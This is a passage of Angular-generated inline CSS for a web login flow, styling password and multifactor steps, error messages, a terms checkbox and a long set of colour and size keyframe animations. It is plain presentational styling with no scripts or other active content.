            display: inline-block;
            vertical-align: middle
        }

        .ipswich-main-engagement-data-ul-item-pipe[_ngcontent-c34] {
            color: #666;
            font-size: 14px;
            display: inline-block;
            margin-left: 3px;
            margin-right: 3px;
            vertical-align: middle
        }

        .ipswich-main-engagement-data-ul-item-link[_ngcontent-c34] {
            color: #0097c1;
            font-size: 14px;
            display: inline-block;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            vertical-align: middle;
            cursor: pointer
        }

        .ipswich-main-engagement-data-ul-item-link[_ngcontent-c34]:hover {
            color: #005b75;
            text-decoration: underline
        }

        .ipswich-main-buttons-login-password[_ngcontent-c34] {
            padding-top: 16px;
            padding-right: 72px
        }

        .ipswich-main-engagement-password[_ngcontent-c34] {
            position: absolute;
            width: 100%;
            bottom: -55px;
            left: 0;
            padding-right: 72px
        }

        @media only screen and (min-width:1024px) {

            .error-message[_ngcontent-c34],
            .error-message-bottom[_ngcontent-c34] {
                padding-right: 155px
            }
        }

        @media only screen and (min-width:768px) {
            .ipswich-main-buttons-login-password[_ngcontent-c34] {
                padding-top: 10px
            }
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich-main-data[_ngcontent-c34] {
                padding: 8px 42px 0 32px
            }

            .ipswich-main-engagement-password[_ngcontent-c34] {
                padding-right: 42px;
                position: relative;
                bottom: 5px;
                margin-top: 22px
            }

            .ipswich-main-keyboard[_ngcontent-c34] {
                padding: 10px 42px 6px
            }

            .ipswich-main-buttons-login-password[_ngcontent-c34] {
                padding-right: 42px
            }

            .ipswich-main-validation[_ngcontent-c34] {
                padding-left: 66px
            }

            .ipswich-main-validation-description[_ngcontent-c34] {
                width: 76%;
                font-size: 12px;
                padding-left: 5px
            }

            .ipswich-main-validation-image[_ngcontent-c34] {
                width: 44px
            }

            .ipswich-main-validation-image[_ngcontent-c34] img[_ngcontent-c34] {
                width: 100%
            }

            .ipswich-main-engagement-password[_ngcontent-c34] .ipswich-main-engagement-data-ul-item-link[_ngcontent-c34] {
                font-size: 13px
            }

            .ipswich-advertising[_ngcontent-c34] {
                width: 280px
            }

            .error-message[_ngcontent-c34] {
                left: 71px;
                padding-right: 42px
            }

            .successful-generic-message[_ngcontent-c34] {
                bottom: 0
            }
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .ipswich-main-keyboard[_ngcontent-c34] {
                visibility: hidden;
                pointer-events: none
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            form.wizardAutoHeightMode[_ngcontent-c34] .ipswich-main-buttons-login-password[_ngcontent-c34] {
                margin-bottom: 0
            }

            form.wizardAutoHeightMode[_ngcontent-c34] .ipswich-main-engagement-password[_ngcontent-c34] {
                position: relative;
                bottom: auto;
                left: auto;
                margin-top: 30px;
                margin-bottom: 12px;
                text-align: right
            }

            form.wizardAutoHeightMode[_ngcontent-c34] .ipswich-main-engagement-password[_ngcontent-c34] .ipswich-main-engagement-data[_ngcontent-c34] {
                display: inline-block;
                float: none
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .successful-generic-message[_ngcontent-c34] {
                bottom: 14px
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich-main-validation-image[_ngcontent-c34] {
                width: 60px
            }

            .ipswich-main-validation-image[_ngcontent-c34] img[_ngcontent-c34] {
                width: 100%
            }

            .ipswich-main-validation[_ngcontent-c34] {
                padding-left: 44px
            }

            .ipswich-main-validation-description[_ngcontent-c34] {
                width: 69%;
                font-size: 12px;
                padding-left: 8px
            }

            .ipswich-main-engagement-data-ul-item-link[_ngcontent-c34],
            .ipswich-main-engagement-data-ul-item-title[_ngcontent-c34] {
                font-size: 12px;
                vertical-align: middle
            }

            .ipswich-main-engagement-password[_ngcontent-c34] {
                bottom: -75px
            }

            .successful-generic-message[_ngcontent-c34] {
                bottom: 14px
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich-main-validation-image[_ngcontent-c34] {
                width: 60px
            }

            .ipswich-main-validation-image[_ngcontent-c34] img[_ngcontent-c34] {
                width: 100%
            }

            .ipswich-main-validation[_ngcontent-c34] {
                padding-left: 22px
            }

            .ipswich-main-validation-description[_ngcontent-c34] {
                width: 70%;
                font-size: 12px;
                padding-left: 8px
            }

            .ipswich-main-engagement-data-ul-item[_ngcontent-c34] {
                display: block
            }

            .ipswich-main-engagement-data-ul-item-link[_ngcontent-c34],
            .ipswich-main-engagement-data-ul-item-title[_ngcontent-c34] {
                font-size: 12px;
                vertical-align: middle
            }

            .ipswich-main-data[_ngcontent-c34] {
                padding-top: 8px;
                padding-right: 20px;
                padding-left: 20px
            }

            .ipswich-main-keyboard[_ngcontent-c34] {
                padding-right: 24px;
                padding-left: 20px;
                padding-bottom: 12px
            }

            .ipswich-main-data-input[_ngcontent-c34] {
                width: calc(100% - 42px)
            }

            .ipswich-main-engagement-data-ul-item-pipe[_ngcontent-c34] {
                display: none
            }

            .ipswich-main-engagement-password[_ngcontent-c34] {
                bottom: 20px;
                padding-right: 20px;
                padding-left: 20px
            }

            .ipswich-main-buttons-login-password[_ngcontent-c34] {
                padding-right: 20px;
                padding-left: 20px;
                margin-bottom: 80px
            }

            .ipswich-main-buttons-login-password[_ngcontent-c34]>a[_ngcontent-c34] {
                width: 114px !important
            }

            .ipswich-main-engagement-data[_ngcontent-c34] {
                width: 100%
            }

            .ipswich-main-buttons-link[_ngcontent-c34] {
                width: 125px
            }

            .error-message[_ngcontent-c34] {
                left: 58px;
                padding-right: 20px
            }

            .successful-generic-message[_ngcontent-c34] {
                bottom: 14px
            }
        }

        .ipswich-main-message-help[_ngcontent-c34] {
            font-size: 11px;
            line-height: 15px;
            display: inline-block
        }

        .bots [_nghost-c34] .hideStepPasswordInformation[_ngcontent-c34] {
            display: none
        }

        .bots [_nghost-c34] .ipswich-main-validation[_ngcontent-c34] {
            padding: 35px 0 0 60px
        }

        .bots [_nghost-c34] .ipswich-main-data[_ngcontent-c34] .error-message[_ngcontent-c34] {
            left: 60px
        }

        .bots [_nghost-c34] .ipswich-main-buttons-login-password[_ngcontent-c34] {
            position: absolute;
            bottom: 0;
            right: 0;
            padding-bottom: 20px
        }

        .bots [_nghost-c34] .ipswich[_ngcontent-c34] {
            height: 100%;
            border-bottom: 0
        }
    </style>
<style>
        @-webkit-keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @keyframes fromSharktoHumming-bird {
            0% {
                color: #0097c1
            }

            100% {
                color: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes fromHumming-birdtoShark {
            0% {
                color: #005b75
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromSharktoHumming-birdBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromHumming-birdtoSharkBackground {
            0% {
                background: #005b75
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @keyframes fromDevilfishtoHummingbirdBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #005b75
            }
        }

        @-webkit-keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoDevilfishBackground {
            0% {
                background: #12447f
            }

            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @keyframes fromDevilfishtoSharkBackground {
            0% {
                background: #0097c1
            }

            100% {
                background: #12447f
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @keyframes fromBettafightertoCrabBackgroundAndSize {
            0% {
                background: 0 0;
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }

            100% {
                background: rgba(0, 0, 0, .05);
                -webkit-transform: scale(.7);
                transform: scale(.7)
            }
        }

        @-webkit-keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes ListDetailBkgfromBettafightertoCrab {
            0% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }

            100% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @keyframes ListDetailBkgfromCrabtoBettafighter {
            0% {
                width: 30px;
                top: 2px;
                left: 8px;
                height: 28px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 8px;
                left: 19px;
                height: 16px;
                background: 0 0
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @keyframes ListRowHoverInLineAndBackground {
            0% {
                border: 1px solid transparent;
                background: #fff
            }

            100% {
                border: 1px solid #12447f;
                background: #f8f8f8
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundWarning {
            0% {
                border: 1px solid transparent;
                background: #fef6d1
            }

            100% {
                border: 1px solid #12447f;
                background: #fef6d1
            }
        }

        @-webkit-keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @keyframes ListRowHoverInLineAndBackgroundAlert {
            0% {
                border: 1px solid transparent;
                background: #fffbeb
            }

            100% {
                border: 1px solid #12447f;
                background: #fffbeb
            }
        }

        @-webkit-keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @keyframes TabsColorHoverIn {
            0% {
                color: #666
            }

            100% {
                color: #0097c1
            }
        }

        @-webkit-keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @keyframes TabsColorHoverOut {
            0% {
                color: #0097c1
            }

            100% {
                color: #666
            }
        }

        @-webkit-keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes InboxHoverIn {
            0% {
                width: 50%;
                top: 20%;
                left: 20%;
                height: 50%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes UserUtilitiesHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LogoutHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes ContactUsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @keyframes LanguageOptionsHoverIn {
            0% {
                width: 80%;
                top: 10%;
                left: 10%;
                height: 80%
            }

            100% {
                width: 100%;
                top: 0;
                left: 0;
                height: 100%;
                background: rgba(0, 0, 0, .2)
            }
        }

        @-webkit-keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @keyframes fromZebratoZebraBackground {

            0%,
            100% {
                background: #b7efff
            }
        }

        @-webkit-keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @keyframes fromSharktoSharkBackground {

            0%,
            100% {
                background: #0097c1
            }
        }

        @-webkit-keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @keyframes frombettafightertobettafighterBorder {

            0%,
            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @keyframes fromSharktobettafighterBorder {
            0% {
                border: 1px solid #0097c1
            }

            100% {
                border: 1px solid transparent
            }
        }

        @-webkit-keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @keyframes frombettafightertoSharkBorder {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #0097c1
            }
        }

        @-webkit-keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @keyframes from0to360Rotate {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 360deg);
                transform: rotate3d(0, 0, 1, 360deg)
            }
        }

        @-webkit-keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @keyframes fromCatdarktoCatBackground {
            0% {
                background: #00743c
            }

            100% {
                background: #00a756
            }
        }

        @-webkit-keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @keyframes fromCattoCatdarkBackground {
            0% {
                background: #00a756
            }

            100% {
                background: #00743c
            }
        }

        @-webkit-keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @keyframes fromBettafightertoSharkBorderBottom {
            0% {
                border-bottom: 1px solid transparent
            }

            100% {
                border-bottom: 1px solid #0097c1
            }
        }

        @-webkit-keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @keyframes fromSharktoBettafighterBorderBottom {
            0% {
                border-bottom: 1px solid #0097c1
            }

            100% {
                border-bottom: 1px solid transparent
            }
        }

        @-webkit-keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes fromBettafightertoCrabBackground {
            0% {
                background: 0 0
            }

            100% {
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @keyframes fromCrabtoBettafighterBackground {
            0% {
                background: rgba(0, 0, 0, .05)
            }

            100% {
                background: 0 0
            }
        }

        @-webkit-keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @keyframes from0to100Height {
            0% {
                height: 0
            }

            100% {
                height: auto
            }
        }

        @-webkit-keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @keyframes fromAutoto0Height {
            0% {
                height: auto
            }

            100% {
                height: 0
            }
        }

        @-webkit-keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @keyframes from0to90Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }
        }

        @-webkit-keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @keyframes from90to0Rotate3D {
            0% {
                -webkit-transform: rotate3d(0, 0, 1, 90deg);
                transform: rotate3d(0, 0, 1, 90deg)
            }

            100% {
                -webkit-transform: rotate3d(0, 0, 1, 0deg);
                transform: rotate3d(0, 0, 1, 0deg)
            }
        }

        @-webkit-keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @keyframes fadeOutTableCell {
            0% {
                visibility: visible;
                opacity: 1;
                display: table-cell
            }

            99% {
                visibility: visible;
                opacity: 0;
                display: table-cell
            }

            100% {
                visibility: hidden;
                display: none
            }
        }

        @-webkit-keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @keyframes MonitorFadeIn {
            0% {
                width: 80px
            }

            100%,
            40% {
                width: 100%
            }
        }

        @-webkit-keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @keyframes MonitorFadeOut {

            0%,
            50% {
                width: 100%
            }

            100% {
                width: 80px
            }
        }

        @-webkit-keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @keyframes BatchMonitorFadeIn {

            0%,
            40% {
                max-height: 0
            }

            100% {
                max-height: calc(100vh - 100px)
            }
        }

        @-webkit-keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        @keyframes BatchMonitorFadeOut {
            0% {
                max-height: calc(100vh - 100px)
            }

            100%,
            50% {
                max-height: 0
            }
        }

        .error-message[_ngcontent-c35] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 0;
            padding: 0 72px 0 0;
            position: absolute;
            left: 81px;
            overflow: hidden;
            max-height: 2.85714em;
            line-height: normal
        }

        .successful-message[_ngcontent-c35] {
            color: green;
            background: #fff;
            font-weight: 500;
            display: block;
            width: 100%;
            margin-left: 47px
        }

        .ipswich-main-keyboard[_ngcontent-c35] {
            text-align: right;
            padding: 10px 74px 6px 42px
        }

        .ipswich-main-keyboard-link[_ngcontent-c35] {
            color: #0097c1;
            font-size: 12px;
            text-align: right;
            display: inline-block;
            cursor: pointer;
            border-bottom: 1px solid transparent;
            -webkit-animation: .2s fromSharktoBettafighterBorderBottom;
            animation: .2s fromSharktoBettafighterBorderBottom
        }

        .ipswich-main-keyboard-link[_ngcontent-c35]:hover {
            color: #0097c1;
            border-bottom: 1px solid #0097c1;
            -webkit-animation: .2s fromBettafightertoSharkBorderBottom;
            animation: .2s fromBettafightertoSharkBorderBottom
        }

        .ipswich-main-request-token[_ngcontent-c35] {
            text-align: right;
            padding: 10px 74px 6px 42px
        }

        .ipswich-main-request-token-link[_ngcontent-c35] {
            color: #0097c1;
            font-size: 12px;
            text-align: right;
            display: inline-block;
            border-bottom: 1px solid transparent;
            -webkit-animation: .2s fromSharktoBettafighterBorderBottom;
            animation: .2s fromSharktoBettafighterBorderBottom
        }

        .ipswich-main-request-token-link[_ngcontent-c35]:hover {
            color: #0097c1;
            border-bottom: 1px solid #0097c1;
            -webkit-animation: .2s fromBettafightertoSharkBorderBottom;
            animation: .2s fromBettafightertoSharkBorderBottom
        }

        .ipswich-main-data[_ngcontent-c35] {
            padding: 24px 72px 0 42px
        }

        .ipswich-main-data[_ngcontent-c35] i[_ngcontent-c35] {
            font-size: 32px;
            margin-right: 4px;
            vertical-align: top;
            margin-top: 4px;
            display: inline-block;
            color: #17d2dc
        }

        .ipswich-main-data-input[_ngcontent-c35] {
            width: calc(100% - 42px);
            border: 1px solid #bbb;
            height: 40px;
            padding: 0 14px;
            font-size: 16px;
            color: #333
        }

        .ipswich-main-data-input.required[_ngcontent-c35],
        .ipswich-main-data-input.required[_ngcontent-c35]:focus {
            border-left: 3px solid #0097c1
        }

        .ipswich-main-data-input[_ngcontent-c35]:focus {
            border: 1px solid #999;
            outline: 0;
            background: #f2f6f6;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            -webkit-animation: .3s ipswich-login-input-animated;
            animation: .3s ipswich-login-input-animated
        }

        @-webkit-keyframes ipswich-login-input-animated {
            0% {
                border: 1px solid #bbb;
                background: 0 0;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                background: #f2f6f6;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes ipswich-login-input-animated {
            0% {
                border: 1px solid #bbb;
                background: 0 0;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                background: #f2f6f6;
                border-left: 3px solid #0097c1
            }
        }

        @-webkit-keyframes ipswich-login-input-line-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes ipswich-login-input-line-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #999;
                border-left: 3px solid #0097c1
            }
        }

        .ipswich-main-buttons-login-multifactor[_ngcontent-c35] {
            padding-top: 46px;
            padding-right: 72px
        }

        .ipswich-main-questions[_ngcontent-c35] {
            padding: 14px 0 0 78px;
            margin-bottom: -10px;
            color: #333
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich-main-data[_ngcontent-c35] {
                padding: 8px 42px 0 32px
            }

            .ipswich-main-keyboard[_ngcontent-c35] {
                padding: 4px 42px 6px
            }

            .ipswich-main-buttons-login-multifactor[_ngcontent-c35] {
                padding-right: 42px
            }

            .ipswich-main-questions[_ngcontent-c35] {
                padding: 6px 0 10px 78px
            }

            .error-message[_ngcontent-c35] {
                left: 71px;
                padding-right: 42px
            }
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .ipswich-main-keyboard[_ngcontent-c35] {
                visibility: hidden;
                pointer-events: none
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .ipswich-main-buttons-login-multifactor.wizardAutoHeightMode[_ngcontent-c35] {
                margin-bottom: 30px
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich-main-data[_ngcontent-c35] {
                padding-top: 8px;
                padding-right: 20px;
                padding-left: 20px
            }

            .ipswich-main-keyboard[_ngcontent-c35] {
                padding-top: 6px;
                padding-right: 24px;
                padding-left: 20px
            }

            .ipswich-main-data-input[_ngcontent-c35] {
                width: calc(100% - 42px)
            }

            .ipswich-main-questions[_ngcontent-c35] {
                padding: 4px 0 0 56px;
                margin-bottom: 0
            }

            .ipswich-main-buttons-login-multifactor[_ngcontent-c35] {
                padding-right: 20px;
                padding-left: 20px
            }

            .ipswich-main-buttons-login-multifactor[_ngcontent-c35]>a[_ngcontent-c35] {
                width: 114px !important
            }

            .error-message[_ngcontent-c35] {
                left: 58px;
                padding-right: 20px
            }
        }

        .bots [_nghost-c35] .hideStepPasswordInformation[_ngcontent-c35] {
            display: none
        }

        .bots [_nghost-c35] .ipswich-main-validation[_ngcontent-c35] {
            padding: 28px 0 0 60px
        }

        .bots [_nghost-c35] .ipswich-main-data[_ngcontent-c35] .error-message[_ngcontent-c35] {
            left: 60px
        }

        .bots [_nghost-c35] .ipswich-main-buttons-login-multifactor[_ngcontent-c35] {
            position: absolute;
            bottom: 0;
            right: 0;
            padding-bottom: 20px;
            margin-bottom: 0
        }

        .bots [_nghost-c35] .ipswich[_ngcontent-c35] {
            height: 100%;
            border-bottom: 0
        }
    </style>
<style>
        .main-container[_ngcontent-c36] {
            padding: 0 40px
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .main-container[_ngcontent-c36] {
                padding: 0 32px
            }
        }
    </style>
<style>
        .main-form[_ngcontent-c38] {
            padding: 10px 42px 132px
        }

        .main-container-login-utils[_ngcontent-c38] {
            padding: 10px 28px 20px;
            overflow: auto;
            height: 228px;
            margin: 10px 15px 10px 10px
        }

        .error-message[_ngcontent-c38] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 0;
            padding: 0;
            line-height: normal
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .main-container-login-utils[_ngcontent-c38] {
                height: 158px;
                margin-top: 5px;
                margin-bottom: 5px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            form.wizardAutoHeightMode[_ngcontent-c38] {
                height: auto
            }
        }

        @media only screen and (max-width:767px) and (min-width:480px) {
            .main-container-login-utils[_ngcontent-c38] {
                height: 238px;
                padding-bottom: 0
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .main-container-login-utils[_ngcontent-c38] {
                height: 168px;
                padding-bottom: 0;
                padding-left: 20px;
                padding-right: 20px
            }
        }
    </style>
<style>
        .main-container[_ngcontent-c39] {
            padding: 20px 25px 25px 20px
        }

        .main-container-login-utils[_ngcontent-c39] {
            padding: 0 28px 20px;
            overflow-x: hidden;
            overflow-y: auto;
            height: 219px;
            margin: 20px 15px 10px 10px
        }

        .error-message[_ngcontent-c39] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 0;
            padding: 0;
            position: absolute;
            left: 38px;
            line-height: normal
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .main-container-login-utils[_ngcontent-c39] {
                height: 138px
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .main-container-login-utils.wizardAutoHeightMode[_ngcontent-c39] {
                height: auto
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .main-container-login-utils[_ngcontent-c39] {
                height: 148px;
                padding-left: 20px;
                padding-right: 20px
            }

            .error-message[_ngcontent-c39] {
                left: 30px
            }
        }
    </style>
<style>
        .main-form[_ngcontent-c40] {
            padding: 24px 42px;
            overflow: auto;
            height: 249px
        }

        .error-message[_ngcontent-c40] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 0;
            padding: 0 0 0 151px;
            line-height: normal
        }
    </style>
<style>
        @charset "UTF-8";

        .ipswich-main-firm-data[_ngcontent-c41] {
            padding: 0 38px
        }

        .ipswich-main-content-text[_ngcontent-c41] {
            max-height: 242px;
            border-top: 1px solid #e1e1e1;
            border-bottom: 1px solid #e1e1e1;
            padding: 10px 0;
            margin: 10px 38px 0
        }

        .ipswich-main-content-text-scroll[_ngcontent-c41] {
            height: 164px;
            overflow: auto;
            font-size: 12px;
            color: #444;
            padding-right: 10px
        }

        .ipswich-main-content-text-scroll-data[_ngcontent-c41] {
            display: block;
            white-space: pre-line;
            padding-bottom: 10px
        }

        .ipswich-main-content-check[_ngcontent-c41] {
            position: relative;
            margin: 12px 38px 18px
        }

        input.ipswich-main-content-check-input[type=checkbox][_ngcontent-c41] {
            display: none
        }

        label.ipswich-main-content-check-label[_ngcontent-c41]:before {
            content: "";
            display: inline-block;
            width: 16px;
            height: 16px;
            margin-right: 6px;
            position: absolute;
            left: 0;
            bottom: 3px;
            background: 0 0;
            -webkit-box-shadow: none;
            box-shadow: none;
            border: 1px solid #ccc
        }

        .ipswich-main-content-check[_ngcontent-c41] label.ipswich-main-content-check-label[_ngcontent-c41] {
            margin-bottom: 10px;
            margin-left: 26px;
            font-size: 14px;
            color: #444
        }

